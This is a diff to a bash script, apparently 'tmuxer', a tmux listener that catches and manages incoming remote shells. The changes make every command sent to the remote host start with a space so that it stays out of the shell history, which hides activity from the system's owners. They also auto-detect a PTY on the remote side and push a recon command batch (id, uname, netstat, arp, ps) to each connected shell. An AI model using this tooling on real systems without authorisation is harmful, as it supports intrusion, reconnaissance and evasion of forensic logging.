@@ -4,6 +4,7 @@
 PORT=""
 LOGDIR="$HOME/tmuxer-logs"
 INIT_CMDS=$'id\nuname -a\nw\nnetstat -tulip\nip a\narp -a\nip r\nps ax'
+PREPEND_SPACE=1
 ORIG_ARGS=("$@")
 
 # ── functions ─────────────────────────────────────────────────────────────────
@@ -18,6 +19,9 @@ Options:
   --init-cmds <cmds>      Semicolon-separated commands mapped to F5 in each window
                           (default: id;uname -a;w;netstat -tulip;ip a;arp -a;ip r;ps ax)
                           Pass empty string to disable: --init-cmds ""
+  --no-prepend-space      Do not prepend commands with a space (default: prepend,
+                          so commands are excluded from remote shell history via
+                          HISTCONTROL=ignorespace)
   --install               Install as 'tmuxer' symlink in /usr/local/bin
 
 Examples:
@@ -88,14 +92,24 @@ EOF
   } >> "$help_file"
   tmux bind-key -n F1 display-popup -E -w 220 -h 18 "cat $help_file; read -rsk1 2>/dev/null || read -rs -n1"
 
-  # F5: recon commands
+  # F5: recon commands — written directly to @out_fifo, bypassing local PTY
   if [[ -n "$INIT_CMDS" ]]; then
     f5_script=$(mktemp /tmp/tmuxer_f5_XXXXXX)
     {
       printf '#!/usr/bin/env bash\n'
+      printf '%s\n' 'fifo=$(tmux show-options -wv @out_fifo 2>/dev/null)'
+      printf '%s\n' '[[ -p "$fifo" ]] || { tmux display-message "F5: no fifo"; exit 1; }'
+      printf '%s\n' 'send_cmd() {'
+      if [[ "$PREPEND_SPACE" == "1" ]]; then
+        printf '%s\n' '  printf " %s\n" "$1" >> "$fifo"'
+      else
+        printf '%s\n' '  printf "%s\n" "$1" >> "$fifo"'
+      fi
+      printf '%s\n' '  sleep 0.3'
+      printf '%s\n' '}'
       while IFS= read -r cmd; do
         [[ -z "$cmd" ]] && continue
-        printf 'tmux send-keys %q Enter\nsleep 0.3\n' "$cmd"
+        printf 'send_cmd %q\n' "$cmd"
       done <<< "$INIT_CMDS"
     } > "$f5_script"
     chmod +x "$f5_script"
@@ -187,21 +201,45 @@ handle_connection() {
     touch "$logfile"
   fi
 
+  # PTY probe — sent before window setup so remote executes during init delay
+  local probe_cmd="[ -t 0 ] && echo __PTY__ || echo __NOPTY__"
+  [[ "$PREPEND_SPACE" == "1" ]] && printf ' %s\n' "$probe_cmd" || printf '%s\n' "$probe_cmd"
+
   local init_display f5_hint=""
   init_display=$(printf '%s\n' "$INIT_CMDS" | paste -sd '|' | sed 's/|/ | /g')
   [[ -n "$INIT_CMDS" ]] && f5_hint="; echo '[F5] autorun: $init_display'"
 
   win_id=$(tmux new-window -P -F "#{window_id}" -n "$remote_ip" \
-    "echo '[*] connection from $remote_ip'$f5_hint; echo '[F2] toggle raw mode (enable after pty.spawn for arrow keys / tab)'; trap 'stty sane; rm -f $in $out' EXIT; cat <$in & cat >$out; wait")
+    "echo '[*] connection from $remote_ip'$f5_hint; echo '[F2] raw mode toggle (auto-detected or manual)'; trap 'stty sane; rm -f $in $out' EXIT; cat <$in & cat >$out; wait")
 
   tmux set-option -w -t "$win_id" @out_fifo "$out"
   sleep 0.1
   new_pane_tty=$(tmux display-message -p -t "$win_id" "#{pane_tty}")
 
-  if [[ -n "$logfile" ]]; then
-    cat <&0 | tee >(while IFS= read -r line; do printf '%s REMOTE: %s\n' "$(date '+%H:%M:%S')" "$line"; done >>"$logfile") >"$in" &
+  # Read probe response — remote executed it during the window setup delay
+  local pty_detected=0 probe_buf="" probe_line probe_start=$SECONDS
+  while IFS= read -r -t 1 probe_line <&0 2>/dev/null; do
+    [[ "$probe_line" == *"__PTY__"* ]]   && { pty_detected=1; break; }
+    [[ "$probe_line" == *"__NOPTY__"* ]] && break
+    probe_buf+="$probe_line"$'\n'
+    [[ $((SECONDS - probe_start)) -ge 3 ]] && break
+  done
+
+  if [[ $pty_detected -eq 1 ]]; then
+    tmux set-option -w -t "$win_id" @raw_mode 1
+    stty raw -echo < "$new_pane_tty"
+    echo "[*] PTY detected on $remote_ip — raw mode enabled" >"$LISTENER_TTY"
+    printf '[*] PTY detected — raw mode ON (F2 to toggle)\n' >"$new_pane_tty"
   else
-    cat <&0 >"$in" &
+    printf '[*] No PTY — use pty.spawn + F2 to upgrade\n' >"$new_pane_tty"
+  fi
+
+  # Pipe loops — re-feed buffered pre-probe data so pane sees it
+  if [[ -n "$logfile" ]]; then
+    { printf '%s' "$probe_buf"; cat <&0; } \
+      | tee >(while IFS= read -r line; do printf '%s REMOTE: %s\n' "$(date '+%H:%M:%S')" "$line"; done >>"$logfile") >"$in" &
+  else
+    { printf '%s' "$probe_buf"; cat <&0; } >"$in" &
   fi
   in_pid=$!
 
@@ -229,6 +267,7 @@ start_listener() {
   export LISTENER_TTY=$(tty)
   export LOGDIR
   export INIT_CMDS
+  export PREPEND_SPACE
 
   enforce_tmux
   apply_tmux_settings
@@ -257,9 +296,10 @@ while [[ $# -gt 0 ]]; do
     LOGDIR="${1:-}"
     shift
     ;;
-  --logdir)      LOGDIR="$2";                    shift 2 ;;
-  --init-cmds)   INIT_CMDS="${2//;/$'\n'}";      shift 2 ;;
-  --port | -p)   PORT="$2";                      shift 2 ;;
+  --logdir)            LOGDIR="$2";               shift 2 ;;
+  --init-cmds)         INIT_CMDS="${2//;/$'\n'}"; shift 2 ;;
+  --no-prepend-space)  PREPEND_SPACE=0;           shift   ;;
+  --port | -p)         PORT="$2";                 shift 2 ;;
   *)             PORT="$1";                      shift   ;;
   esac
 done
